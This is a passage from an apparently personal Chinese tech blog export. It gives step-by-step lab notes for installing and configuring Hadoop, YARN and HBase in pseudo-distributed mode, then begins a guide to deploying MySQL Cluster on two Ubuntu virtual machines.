<h4 id="修改core-site-xml文件"><a href="#修改core-site-xml文件" class="headerlink" title="修改core-site.xml文件"></a>修改core-site.xml文件</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  	      <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.tmp.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">value</span>&gt;</span>file:/usr/local/hadoop/tmp<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">description</span>&gt;</span>Abase for other temporary directories.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">name</span>&gt;</span>fs.defaultFS<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://localhost:9000<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<img src="core-site.png">

<h4 id="配置hdfs-site-xml文件"><a href="#配置hdfs-site-xml文件" class="headerlink" title="配置hdfs-site.xml文件"></a>配置hdfs-site.xml文件</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.replication<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">value</span>&gt;</span>1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.name.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">value</span>&gt;</span>file:/usr/local/hadoop/tmp/dfs/name<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.datanode.data.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">value</span>&gt;</span>file:/usr/local/hadoop/tmp/dfs/data<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<img src="hdfs-site.png">

<ul>
<li><p><code>Hadoop</code>配置文件参数</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>属性值</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>fs.defaultFS</td>
<td>NameNode URI The name of the default file system. A URI whose scheme and authority determine the FileSystem implementation. The uri’s scheme determines the config property (fs.SCHEME.impl) naming the FileSystem implementation class. The uri’s authority is used to determine the host, port, etc. for a filesystem.</td>
<td>hdfs://host:port/</td>
</tr>
<tr>
<td>dfs.namenode.name.dir</td>
<td>Determines where on the local filesystem the DFS name node should store the name table(fsimage) 在本地文件系统所在的NameNode的存储空间和持续化处理日志</td>
<td>如果这是一个以逗号分隔的目录列表，然后将名称表被复制的所有目录，以备不时需</td>
</tr>
<tr>
<td>dfs.datanode.data.dir</td>
<td>Determines where on the local filesystem an DFS data node should store its blocks 逗号分隔的一个DataNode上，它应该保存它的块的本地文件系统的路径列表</td>
<td>如果这是一个以逗号分隔的目录列表，那么数据将被存储在所有命名的目录，通常在不同的设备</td>
</tr>
</tbody></table>
</li>
<li><p><code>Hadoop</code>的运行方式是由配置文件决定的(运行<code>Hadoop</code>时会读取配置文件)</p>
</li>
<li><p>因此如果需要从伪分布式模式切换回非分布式模式，需要删除 <code>core-site.xml</code>中的配置项</p>
</li>
<li><p>伪分布式虽然只需要配置<code>fs.defaultFS</code>和<code>dfs.replication</code>就可以运行（可参考官方教程）</p>
</li>
<li><p>若没有配置<code>hadoop.tmp.dir</code>参数，则默认使用的临时目录为 <code>/tmp/hadoo-hadoop</code>，而这个目录在重启时有可能被系统清理掉，导致必须重新执行<code>format</code>。所以同时也指定<code>dfs.namenode.name.dir</code>和<code>dfs.datanode.data.dir</code>，否则在接下来的步骤中可能会出错。</p>
</li>
<li><p>配置完成后，执行 NameNode 的格式化</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;hadoop&#x2F;</span><br><span class="line">.&#x2F;bin&#x2F;hdfs namenode –format</span><br></pre></td></tr></table></figure>
<img src="namenode-format.png">

<img src="format-success.png"></li>
<li><p>启动<code>namenode</code>和<code>datanode</code>进程，并查看启动结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;sbin&#x2F;start-dfs.sh</span><br><span class="line">$ jps</span><br></pre></td></tr></table></figure>
<ul>
<li>启动完成后，可以通过命令<code>jps</code>来判断是否成功启动，若成功启动则会列出如下进程: <code>NameNode</code>、<code>DataNode</code> 和 <code>SecondaryNameNode</code><img src="start-namenode-datanode.png"></li>
</ul>
</li>
<li><p>Hadoop出现错误：<code>WARN util.NativeCodeLoader: Unable to load native-hadoop library for your platform... using builtin-java classes where applicable</code>，解决方案是在文件<code>hadoop-env.sh</code>中增加：<code>export HADOOP_OPTS=&quot;-Djava.library.path=$&#123;HADOOP_HOME&#125;/lib/native&quot;  </code></p>
  <img src="hadoop-warn.png"></li>
<li><p>出现<code>ssh: connect to host master port 22: Connection timed out</code></p>
<img src="hdfs-ssh-timeout.png">

<ul>
<li><p><a href="https://www.itread01.com/content/1548390616.html">解决方法：</a></p>
<ul>
<li><p>查看防火墙</p>
</li>
<li><p>查看ssh是否开启，22端口是否监听</p>
</li>
<li><p><code>sudo vi /etc/hosts</code></p>
  <img src="etc-host.png">

<ul>
<li>127.0.0.1和127.0.1.1都是本地回路/回环地址（区别搜索）</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>有可能出现要求输入localhost密码的情况，如果此时明明输入的是正确的密码却仍无法登入，其原因是由于如果不输入用户名的时候默认的是root用户，但是ssh服务默认没有开root用户的ssh权限</p>
<ul>
<li>输入指令：<code>$vim /etc/ssh/sshd_config</code></li>
<li>PermitRootLogin yes</li>
<li>之后输入下列代码重启SSH服务：<code>$ /etc/init.d/sshd restart</code>，即可正常登入（免密码登录参考前文）</li>
<li>注：Ubuntu 16.04若安装openssh-server，是无法找到/etc/init.d/sshd文件的，但是可以启动/etc/init.d/ssh</li>
</ul>
</li>
<li><p><a href="https://blog.csdn.net/sinat_19628145/article/details/56494337">secondarynamenode没有启动</a></p>
</li>
<li><p><a href="https://blog.csdn.net/weixin_38750084/article/details/82856211">NameNode和SecondaryNameNode的区别</a></p>
</li>
</ul>
<h4 id="访问web界面"><a href="#访问web界面" class="headerlink" title="访问web界面"></a>访问web界面</h4><ul>
<li><p>成功启动后，如果是在桌面版linux上安装的，也可以访问 Web 界面 <a href="http://localhost:9870（老版本为50070）">http://localhost:9870（老版本为50070）</a> 查看NameNode 和 Datanode 信息，还可以在线查看 HDFS 中的文件。 </p>
</li>
<li><p>如果是在服务器版linux上安装的hadoop, 为了进行浏览器访问，需要配置一个桌面版的虚拟机来进行，输入用IP地址代替localhost）</p>
</li>
<li><p>此处配置了静态ip地址为<code>192.18.50.129</code>，在宿主机上输入<code>http://192.168.50.129:9870</code></p>
  <img src="hadoopweb.png"></li>
</ul>
<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ul>
<li>DFS文件系统格式化时，会在namenode数据文件夹（即配置文件中dfs.namenode.name.dir在本地系统的路径）中保存一个current/VERSION文件，记录clusterID，标识了所格式化的 namenode的版本</li>
<li>如果频繁的格式化namenode，那么datanode中保存（即配置文件中dfs.data.dir在本地系统的路径）的current/VERSION文件只是你第一次格式化时保存的namenode的ID，因此就会造成datanode与namenode之间的 id 不一致。可能导致datanode无法启动</li>
</ul>
<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><ul>
<li><p>创建执行MapReduce作业所需的 DFS 目录:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ bin&#x2F;hdfs dfs -mkdir &#x2F;user</span><br><span class="line">$ bin&#x2F;hdfs dfs -mkdir &#x2F;user&#x2F;&lt;username&gt;  #&lt;username&gt; 问用户名，如hadoop</span><br></pre></td></tr></table></figure></li>
<li><p>拷贝输入文件到分布式文件系统:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ bin&#x2F;hdfs dfs -put etc&#x2F;hadoop input</span><br></pre></td></tr></table></figure></li>
<li><p>运行一些例子</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bin&#x2F;hadoop jar share&#x2F;hadoop&#x2F;mapreduce&#x2F;hadoop-mapreduce-examples-3.2.1.jar grep input output &#39;dfs[a-z.]+&#39;</span><br></pre></td></tr></table></figure></li>
<li><p>查看输出的文件(files): 从分布式文件系统中拷贝文件到本地文件系统并查看:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bin&#x2F;hdfs dfs -get output output</span><br><span class="line">cat output&#x2F;*</span><br></pre></td></tr></table></figure>
<p>或者直接在分布式文件系统上查看:</p>
<p><code>$ bin/hdfs dfs -cat output/*</code></p>
<p>我也不知道对不对</p>
<img src="mapreduce-output.png"></li>
<li><p>结束运行<code>sbin/stop-dfs.sh</code></p>
</li>
</ul>
<h4 id="YARN单机配置"><a href="#YARN单机配置" class="headerlink" title="YARN单机配置"></a>YARN单机配置</h4><ul>
<li><p>通过设置几个参数并运行ResourceManager daemon and NodeManager daemon，可以在YARN上以伪分布模式运行MapReduce job</p>
<p>配置mapred-site.xml(cd /usr/local/hadoop/etc/hadoop)如下:</p>
<img src="mapred-site.png">

<p>配置yarn-site.xml如下：</p>
<img src="yarn-site.png"></li>
<li><p>启动ResourceManager daemon 和 NodeManager daemon:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;hadoop</span><br><span class="line">sbin&#x2F;start-yarn.sh</span><br><span class="line"></span><br><span class="line"># 输出如下</span><br><span class="line">Starting resourcemanager</span><br><span class="line">Starting nodemanagers</span><br><span class="line"></span><br><span class="line">sbin&#x2F;stop-yarn.sh # 关闭</span><br></pre></td></tr></table></figure></li>
<li><p>如果是在桌面版linux上安装的, 可以用浏览器打开资源管理器端口，默认为：ResourceManager - <a href="http://localhost:8088/">http://localhost:8088/</a><br>（如果是在服务器版linux上安装的hadoop, 为了进行浏览器访问，需要配置一个桌面版的虚拟机来进行，输入用IP地址代替localhost） - 同上</p>
  <img src="start-yarn.png"></li>
</ul>
<h3 id="安装Hbase和简单使用"><a href="#安装Hbase和简单使用" class="headerlink" title="安装Hbase和简单使用"></a>安装Hbase和简单使用</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 解压安装包hbase-1.2.11-bin.tar.gz至路径 &#x2F;usr&#x2F;local</span><br><span class="line">$ sudo tar -zxvf  hbase-1.2.11-bin.tar.gz -C &#x2F;usr&#x2F;local</span><br><span class="line"># 将解压的文件名hbase-1.2.11改为hbase，以方便使用</span><br><span class="line">$ sudo mv &#x2F;usr&#x2F;local&#x2F;hbase-1.2.11  &#x2F;usr&#x2F;local&#x2F;hbase</span><br><span class="line">cd &#x2F;usr&#x2F;local</span><br><span class="line">$ sudo chown -R hadoop .&#x2F;hbase  # 将hbase下的所有文件的所有者改为hadoop，hadoop是当前用户的用户名。</span><br></pre></td></tr></table></figure>
<h4 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h4><ul>
<li><p>给hbase配置环境变量，将下面代码添加到.bashrc文件<code>:export PATH=$PATH:/usr/local/hbase</code></p>
  <img src="hbase-env.png"></li>
<li><p>执行source ~/.bashrc使设置生效，并查看hbase是否安装成功<code>/usr/local/hbase/bin/hbase version</code>或者直接<code>hbase -version</code></p>
  <img src="hbase-success.png"></li>
</ul>
<h4 id="hBase单机配置"><a href="#hBase单机配置" class="headerlink" title="hBase单机配置"></a>hBase单机配置</h4><ul>
<li><p>单机配置（可能需要配置JAVA_HOME环境变量，由于本实验指南在HADOOP安装时已配置，故省略）</p>
</li>
<li><p>配置<code>/usr/local/hbase/conf/hbase-site.xml</code>如下</p>
<img src="hbase-site.png"></li>
<li><p>采用如下命令启动服务、查看进程和启动客户端</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd &#x2F;usr&#x2F;local&#x2F;hbase</span><br><span class="line">$ bin&#x2F;start-hbase.sh</span><br><span class="line">$ jps</span><br><span class="line">$ bin&#x2F;hbase shell</span><br></pre></td></tr></table></figure>
  <img src="hbase-start.png"></li>
</ul>
<h4 id="配置伪分布模式的指南"><a href="#配置伪分布模式的指南" class="headerlink" title="配置伪分布模式的指南"></a>配置伪分布模式的指南</h4><ul>
<li>配置分布模式方法请查阅官方文档</li>
</ul>
<h5 id="配置hbase-env-sh"><a href="#配置hbase-env-sh" class="headerlink" title="配置hbase-env.sh"></a>配置hbase-env.sh</h5><ul>
<li><p><code>cd /usr/local/hbase/conf</code>修改<code>hbase-site.xml</code>文件</p>
  <img src="modify-hbase-site.png">

<p>  将HBase的数据存储到之前的Hadoop的HDFS上，hbase.rootdir的值便是HDFS上HBase数据存储的位置，值中的主机名和端口号要和之前Hadoop的core-site.xml中的fs.default.name的值相同</p>
</li>
<li><p>启动hBase</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 先stop-hbase.sh</span><br><span class="line">$ start-dfs.sh</span><br><span class="line">$ cd &#x2F;usr&#x2F;local&#x2F;hbase&#x2F;bin</span><br><span class="line">$ .&#x2F;start-hbase.sh</span><br></pre></td></tr></table></figure></li>
<li><p>hbase集群在启动的时候报错：JAVA_HOME is not set and Java could not be found出现这种错误，一般应该是hbase下conf文件下的hbase-env.sh文件中的java_home的环境变量没有配置或者是被注释了</p>
<img src="java_homeisnotset.png">

<p>解决方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;hbase&#x2F;conf</span><br><span class="line">vi hbase-env.sh</span><br><span class="line">export JAVA_HOME&#x3D;&#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;java</span><br></pre></td></tr></table></figure>
<img src="java_home.png"></li>
<li><p>正确顺序：启动Hadoop—&gt;启动HBase—&gt;关闭HBase—&gt;关闭Hadoop</p>
</li>
<li><p>注：执行jps命令，如果在Hadoop进程的基础上新增加了如下三个进程则表示HBase启动成功：1. HMaster，2. HRegionServer，3. HQuorumpeer</p>
</li>
</ul>
<h5 id="查看DFS中Hbase-目录，自动创建"><a href="#查看DFS中Hbase-目录，自动创建" class="headerlink" title="查看DFS中Hbase 目录，自动创建"></a>查看DFS中Hbase 目录，自动创建</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~</span><br><span class="line">hdfs dfs -ls &#x2F;hbase</span><br></pre></td></tr></table></figure>
<blockquote>
<p>hadoop@zizi:~$ hdfs dfs -ls /hbase<br>ls: Call From zizi/127.0.1.1 to localhost:9000 failed on connection exception: java.net.ConnectException: Connection refused; For more details see:  <a href="http://wiki.apache.org/hadoop/ConnectionRefused">http://wiki.apache.org/hadoop/ConnectionRefused</a><br>该问题一般由于没有start dfs 和 yarn造成的</p>
</blockquote>
<img src="hdfs-dfs.png">

<ul>
<li><p>仅仅为了测试和学习，生产环境不会在一台机器上启动备份master</p>
</li>
<li><p>HMaster服务器控制HBase集群，图中的指令启动三个<strong>备份</strong>HMaster，体现了<strong>伪分布式</strong>(在一个机器上多个备份HMaster服务器)，一个HMaster没了，其他的还可以使用</p>
  <img src="master-backup-start.png"></li>
</ul>
<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The HMaster server controls the HBase cluster. You can start up to 9 backup HMaster servers, which makes 10 total HMasters, counting the primary. </span><br><span class="line">To start a backup HMaster, use the local-master-backup.sh. </span><br><span class="line">For each backup master you want to start, add a parameter representing the port offset for that master. </span><br><span class="line">Each HMaster uses two ports (16000 and 16010 by default). </span><br><span class="line">The port offset is added to these ports, so using an offset of 2, the backup HMaster would use ports 16002 and 16012. </span><br><span class="line">The following command starts 3 backup servers using ports 16002&#x2F;16012, 16003&#x2F;16013, and 16005&#x2F;16015.</span><br></pre></td></tr></table></figure>
</code></pre>
<ul>
<li><p>如：start 1</p>
<img src="master-backup-1.png"></li>
<li><p><a href="http://192.168.50.129:16010/master-status%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%EF%BC%8Cport=16000%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE%EF%BC%8Cport=16011%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE">http://192.168.50.129:16010/master-status可以访问，port=16000无法访问，port=16011可以访问</a></p>
<img src="master-status1.png"></li>
<li><p>启动和停止附加区域服务器RegionServers</p>
<img src="regionalserver.png"></li>
<li><p>关闭刚才开启的备份HMaster服务：<code>local-master-backup.sh stop 1</code></p>
</li>
</ul>
<h5 id="建表"><a href="#建表" class="headerlink" title="建表"></a>建表</h5><ul>
<li><p>进入交互界面<code>$ hbase shell</code></p>
<img src="hbase-shell.png"></li>
<li><p>使用create命令创建一个新表，必须规定表名和列族名</p>
<p>使用list 命令可以显示表信息</p>
<p>使用 describe 命令显示表的详细信息，此时表中的VERSIONS默认设置为1</p>
<img src="create-list-describe.png"></li>
<li><p>向表中加入数据，使用 put 命令</p>
<p>使用scan命令扫描整个表取得数据</p>
<p>取一行数据，使用get指令</p>
<img src="put-scan-get.png"></li>
<li><p>修改表模式，使用alter命令，如修改存储版本数，为5个版本</p>
<img src="alter-version.png"></li>
</ul>
<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><ol>
<li><p>请问伪分布和分布式的含义有何不同？就本实验，你是如何理解在一台计算机上做到“伪分布”的？</p>
<ul>
<li>伪分布式模式是一个相对简单的分布式模式，用来测试</li>
<li>不能把这个模式用于生产环节，也不能用于测试性能。</li>
<li>多个HMaster备份节点在一台机器上工作</li>
</ul>
</li>
<li><p>在1.2小节进行安装SSH并设置SSH无密码登陆，请问这个安装的目的是什么？</p>
<blockquote>
<p>ssh must be installed and sshd must be running to use the Hadoop scripts that manage remote Hadoop daemons if the optional start and stop scripts are to be used. Additionally, it is recommmended that pdsh also be installed for better ssh resource management.</p>
</blockquote>
<ul>
<li>ssh必须安装，sshd必须运行，Hadoop的脚本才可以远程操控其他的Hadoop和HBase进程</li>
<li>ssh之间必须都打通，远程登录、自动登录、免密登录</li>
</ul>
</li>
<li><p>如果继续向Hbase的test表中put行键为”row1”，值为其它字符串的数据，put ‘test’ ,’row1’, ‘cf:a’, ‘value6’，会发生什么？如果采用语句get ‘test’, ‘row1’, {COLUMN=&gt;’cf:a’, VERSIONS=&gt;3} 进行查询，分析你得到的结果。put与关系数据库的插入有何不同？</p>
 <img src="put.png">

<ul>
<li>VERSIONS的作用<ul>
<li>当想要用HBase存储历史几个版本的数据是（达到类似于git的效果时）可以设定版本号，版本号为几就是存储几个版本的数据</li>
<li>最开始，没有设定VERSION，则为VERSIONS为1，也就是说，默认情况只会存取一个版本的列数据，当再次插入的时候，后面的值会覆盖前面的值</li>
<li>后面修改表结构，让Hbase表支持存储5个VERSIONS的版本列数据 alter ‘test’, NAME=&gt;’cf’,VERSIONS=&gt;5</li>
<li>解析：一开始row1只有一条数据，然后又插入了第二条数据，虽然scan ‘test’只返回最新的数据，但是用get那条语句能够返回历史版本，所以返回两条数据 <img src="versions.png"></li>
</ul>
</li>
</ul>
</li>
</ol>
<h2 id="错误与解决"><a href="#错误与解决" class="headerlink" title="错误与解决"></a>错误与解决</h2><ul>
<li>如何执行shell脚本！！！-牢记  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hadoop@zizi:&#x2F;usr&#x2F;local&#x2F;hbase&#x2F;bin$ local-master-backup.sh start 2 3 5</span><br><span class="line">local-master-backup.sh: command not found</span><br></pre></td></tr></table></figure></li>
<li><a href="https://blog.csdn.net/tiankong_12345/article/details/93585463">Hbase启动警告：Java HotSpot(TM) 64-Bit Server VM warning: ignoring option PermSize=128m;</a></li>
<li>hBase中get和scan的区别和总结</li>
</ul>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://www.jianshu.com/p/6aeceb5d49cf">HBase入门精要-百闻不如一Run</a></li>
<li><a href="https://www.jianshu.com/p/b23800d9b227">入门HBase，看这一篇就够了</a></li>
</ul>
]]></content>
      <categories>
        <category>DataBase</category>
      </categories>
      <tags>
        <tag>Hadoop</tag>
        <tag>Hbase</tag>
      </tags>
  </entry>
  <entry>
    <title>部署MySQL Cluster集群系统</title>
    <url>/2020/03/25/MySQL-Cluster-set-up-configuration/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
<p>MySQL Cluster is a technology providing <strong>shared-nothing</strong> clustering and auto-sharding for the MySQL database management system.<br>It is designed to provide high availability and high throughput with low latency, while allowing for near linear scalability<br>A MySQL Cluster consists of one or more management nodes (ndb_mgmd) that store the cluster’s configuration and control the data nodes (ndbd), where cluster data is stored.<br>After communicating with the management node, clients (MySQL clients, servers, or native APIs) connect directly to these data nodes.<br>With MySQL Cluster there is typically no replication of data, but instead data node synchronization. For this purpose a special data engine must be used — NDBCluster (NDB)</p>
</blockquote>
<a id="more"></a>

<h2 id="1-实验环境"><a href="#1-实验环境" class="headerlink" title="1 实验环境"></a>1 实验环境</h2><ul>
<li><a href="https://www.digitalocean.com/community/tutorials/how-to-create-a-multi-node-mysql-cluster-on-ubuntu-18-04">英文指南(18.04&amp;16.04)</a></li>
<li>VMware Workstation Pro 12</li>
<li>2台Linux虚拟机，Ubuntu 16.04 Server</li>
<li><a href="http://dev.mysql.com/downloads/cluster/">MySQL-Cluster的安装包</a>：mysql-cluster_8.0.19-1ubuntu16.04_amd64.deb-bundle.tar</li>
<li>设置windows主机和Linux虚拟机共享文件夹</li>
<li>方便编辑配置文件，安装vim <code>sudo apt-get install vim</code></li>
</ul>
<h2 id="2-实验过程"><a href="#2-实验过程" class="headerlink" title="2 实验过程"></a>2 实验过程</h2><h3 id="2-1-前提"><a href="#2-1-前提" class="headerlink" title="2.1 前提"></a>2.1 前提</h3><ul>
<li><p><a href="#%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AE">在VMware下安装Ubuntu虚拟机</a></p>
</li>
<li><p>VMware的克隆，右键虚拟机-&gt;管理-&gt;克隆，创建完整克隆</p>
<ul>
<li><p>两个不同的虚拟机如果是用同一个镜像报错内部错误 -&gt; 就像virtualbox中的多重加载</p>
</li>
<li><p>所以用一个iso安装好一个虚拟机后，将使用ISO映像文件去掉，选择使用物理驱动器。再用这个iso装另外的机器。克隆同理。</p>
<img src="iso.png"></li>
</ul>
</li>
<li><p><a href="https://blog.csdn.net/happysunshineguy/article/details/77158993?utm_source=copy">虚拟机与宿主机共享</a></p>
<ul>
<li>注意用<code>cp</code>而不是<code>mv</code>将vmware tools安装包移动到可以进行解压<code>gunzip</code>的目录，如’/root’。因为该安装包只读，所以无法在该文件夹下进行解压和<code>mv</code>命令</li>
<li>tar格式(tar是打包，不是压缩)<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">打包:tar cvf 目录文件名.tar 目录文件名</span><br><span class="line">解包:tar xvf 目录文件名.tar</span><br></pre></td></tr></table></figure></li>
<li>tar.gz格式：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">压缩:tar -zcvf 目录文件名.tar.gz 目录文件名</span><br><span class="line">解压:tar -zxvf 目录文件名.tar.gz</span><br></pre></td></tr></table></figure>
<h3 id="2-2-设置静态IP"><a href="#2-2-设置静态IP" class="headerlink" title="2.2 设置静态IP"></a>2.2 设置静态IP</h3></li>
</ul>
</li>
</ul>
<h4 id="2-2-1-VMware配置网络环境"><a href="#2-2-1-VMware配置网络环境" class="headerlink" title="2.2.1 VMware配置网络环境"></a>2.2.1 VMware配置网络环境</h4><ul>
<li><p>按要求给一台机器设置静态ip为：192.168.50.128，另一台机器的静态ip为：192.168.50.129。</p>
</li>
<li><p>使用NAT，虚拟机在一个子网中，通过物理机的IP上网。</p>
<img src="delete-VMnet01.png" width=80%></li>
<li><p>去掉<code>使用本地DHCP服务将IP地址分配给虚拟机</code>，并且设置子网IP为：192.168.50.0，子网掩码为：255.255.255.0。因此，在Ubuntu中，设置IP地址的时候，可以设置为192.168.50.x，x可以为1~255。</p>
<img src="dhcp-ipaddress.png" width=80%></li>
<li><p>选择<code>NAT设置</code>，打开NAT设置面板，查看网关地址。</p>
<img src="gatewayaddress.png"></li>
<li><p>在VMWare的虚拟机管理界面，选择Ubuntu的<code>编辑虚拟机设置</code>，打开Ubuntu这个虚拟的设置界面。选择网络适配器，然后确定网络连接选中的是<code>自定义</code>中的VMnet8(NAT模式)。</p>
<img src="VMnet8.png"></li>
</ul>
<h4 id="2-2-2-为Ubuntu设置静态IP地址"><a href="#2-2-2-为Ubuntu设置静态IP地址" class="headerlink" title="2.2.2 为Ubuntu设置静态IP地址"></a>2.2.2 为Ubuntu设置静态IP地址</h4><h5 id="通过Terminal命令行来设置IP地址"><a href="#通过Terminal命令行来设置IP地址" class="headerlink" title="通过Terminal命令行来设置IP地址"></a>通过Terminal命令行来设置IP地址</h5><ul>
<li><p>在命令行输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo vi &#x2F;etc&#x2F;network&#x2F;interfaces </span><br><span class="line"></span><br><span class="line"># 在打开的文件中，若有内容，先全部删除</span><br><span class="line"># 然后输入如下代码</span><br><span class="line"># ip a查看网卡信息是ens33</span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line">auto ens33</span><br><span class="line">iface ens33 inet static</span><br><span class="line">address 192.168.50.128</span><br><span class="line">netmask 255.255.255.0</span><br><span class="line">gateway 192.168.50.2</span><br></pre></td></tr></table></figure>
<img src="configureIPaddress.png"></li>
<li><p>配置DNS服务器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo vi &#x2F;etc&#x2F;resolv.conf</span><br><span class="line"></span><br><span class="line"># 在里面填入阿里的DNS：223.5.5.5</span><br><span class="line">nameserver 223.5.5.5</span><br><span class="line"></span><br><span class="line"># 在命令行中输入：</span><br><span class="line">sudo &#x2F;etc&#x2F;init.d&#x2F;networking restart </span><br></pre></td></tr></table></figure>
<img src="configuredns.png"></li>
<li><p>重复以上步骤，配置第二个虚拟机的静态IP地址。</p>
</li>
</ul>
<h3 id="2-3-集群配置"><a href="#2-3-集群配置" class="headerlink" title="2.3 集群配置"></a>2.3 集群配置</h3><h4 id="2-3-1-集群配置要求"><a href="#2-3-1-集群配置要求" class="headerlink" title="2.3.1 集群配置要求"></a>2.3.1 集群配置要求</h4><ul>
<li><p>拓扑图</p>
<img src="MySQLCluster.png"></li>
<li><p>集群配置要求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># ndbd：MySQL data nodes</span><br><span class="line"># ndb_mgmd：server for the Cluster Manager</span><br><span class="line"># mysqld and mysql：MySQL server&#x2F;client </span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>节点</th>
<th>IP address</th>
<th>运行实例</th>
<th>nodeID</th>
</tr>
</thead>
<tbody><tr>
<td>数据节点1</td>
<td>192.168.50.128</td>
<td>ndbd</td>
<td>11</td>
</tr>
<tr>
<td>数据节点2</td>
<td>192.168.50.129</td>
<td>ndbd</td>
<td>12</td>
</tr>
<tr>
<td>管理节点</td>
<td>192.168.50.129</td>
<td>ndb_mgmd</td>
<td>1</td>
</tr>
<tr>
<td>sql节点1</td>
<td>192.168.50.129</td>
<td>mysqld</td>
<td>13</td>
</tr>
<tr>
<td>sql节点2</td>
<td>192.168.50.128</td>
<td>mysqld</td>
<td>14</td>
</tr>
</tbody></table>
<ul>
<li><p>一般配置，数据节点和管理节点分离(需要3台虚拟机模拟实现)。由于此处只用了2台虚拟机。</p>
<img src="common.png"></li>
</ul>
</li>
<li><p><a href="http://dev.mysql.com/downloads/cluster/">MySQL-Cluster的安装包下载</a>，根据linux操作系统选择正确的版本</p>
</li>
<li><p>若之前安装过mysql-server，需要将mysql-server卸载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 执行以下指令卸载mysql</span><br><span class="line">sudo apt-get autoremove --purge mysql-server</span><br><span class="line">sudo apt-get remove mysql-server</span><br><span class="line">sudo apt-get autoremove mysql-server</span><br><span class="line">sudo apt-get remove mysql-common </span><br></pre></td></tr></table></figure>
